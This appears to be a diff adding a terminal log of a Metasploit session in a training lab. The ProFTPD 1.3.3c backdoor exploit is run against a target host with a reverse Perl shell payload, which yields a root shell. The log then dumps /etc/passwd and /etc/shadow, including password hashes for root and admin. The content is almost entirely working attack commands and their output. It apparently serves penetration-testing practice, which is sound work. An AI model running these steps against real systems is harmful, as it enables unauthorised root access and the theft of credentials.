@@ -1,0 +1,150 @@
+┌──(labuser㉿ip-172-31-86-125)-[~]
+└─$ msfconsole
+
+
+ ______________________________________________________________________________
+|                                                                              |
+|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
+|______________________________________________________________________________|
+      \                                  /                      /
+       \     .                          /                      /            x
+        \                              /                      /
+         \                            /          +           /
+          \            +             /                      /
+           *                        /                      /
+                                   /      .               /
+    X                             /                      /            X
+                                 /                     ###
+                                /                     # % #
+                               /                       ###
+                      .       /
+     .                       /      .            *           .
+                            /
+                           *
+                  +                       *
+
+                                       ^
+####      __     __     __          #######         __     __     __        ####
+####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
+################################################################################
+################################################################################
+# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
+################################################################################
+                                                           https://metasploit.com
+
+
+       =[ metasploit v6.2.22-dev                          ]
++ -- --=[ 2256 exploits - 1187 auxiliary - 402 post       ]
++ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: You can pivot connections over sessions
+started with the ssh_login modules
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search ProFTPD
+
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
+   1  exploit/linux/ftp/proftp_sreplace            2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
+   2  exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
+   3  exploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
+   4  exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution
+   5  exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 5, use 5 or use exploit/unix/ftp/proftpd_133c_backdoor
+
+msf6 > use 5
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 10.5.0.254
+RHOSTS => 10.5.0.254
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > run
+
+[-] 10.5.0.254:21 - Exploit failed: A payload has not been selected.
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show payloads
+
+Compatible Payloads
+===================
+
+   #  Name                                        Disclosure Date  Rank    Check  Description
+   -  ----                                        ---------------  ----    -----  -----------
+   0  payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
+   1  payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
+   2  payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
+   3  payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
+   4  payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
+   5  payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
+   6  payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
+   7  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
+
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set payload 5
+payload => cmd/unix/reverse_perl
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LHOST 10.5.0.1
+LHOST => 10.5.0.1
+msf6 exploit(unix/ftp/proftpd_133c_backdoor) > run
+
+[*] Started reverse TCP handler on 10.5.0.1:4444
+[*] 10.5.0.254:21 - Sending Backdoor Command
+[*] Command shell session 1 opened (10.5.0.1:4444 -> 10.5.1.11:43078) at 2023-04-03 02:44:13 +0000
+
+whoami
+root
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+admin:x:1000:1000::/home/admin:/bin/bash
+
+cat /etc/shadow
+root:$y$j9T$GWXWlbPiR.YBznBxQpS301$hVa4gidXVcFH/0m.rL1aW1VEqkVqic/E.lRj.wJBOeD:19268:0:99999:7:::
+daemon:*:19247:0:99999:7:::
+bin:*:19247:0:99999:7:::
+sys:*:19247:0:99999:7:::
+sync:*:19247:0:99999:7:::
+games:*:19247:0:99999:7:::
+man:*:19247:0:99999:7:::
+lp:*:19247:0:99999:7:::
+mail:*:19247:0:99999:7:::
+news:*:19247:0:99999:7:::
+uucp:*:19247:0:99999:7:::
+proxy:*:19247:0:99999:7:::
+www-data:*:19247:0:99999:7:::
+backup:*:19247:0:99999:7:::
+list:*:19247:0:99999:7:::
+irc:*:19247:0:99999:7:::
+gnats:*:19247:0:99999:7:::
+nobody:*:19247:0:99999:7:::
+_apt:*:19247:0:99999:7:::
+systemd-network:*:19268:0:99999:7:::
+systemd-resolve:*:19268:0:99999:7:::
+messagebus:*:19268:0:99999:7:::
+systemd-timesync:*:19268:0:99999:7:::
+sshd:*:19268:0:99999:7:::
+admin:$y$j9T$Yaz43eoUN1NuXP7TFkdfK.$Xq1oDzJ8GsDNaMc/qSk1DacGMqIsTRdP3MjhQQQdZ35:19268:0:99999:7:::
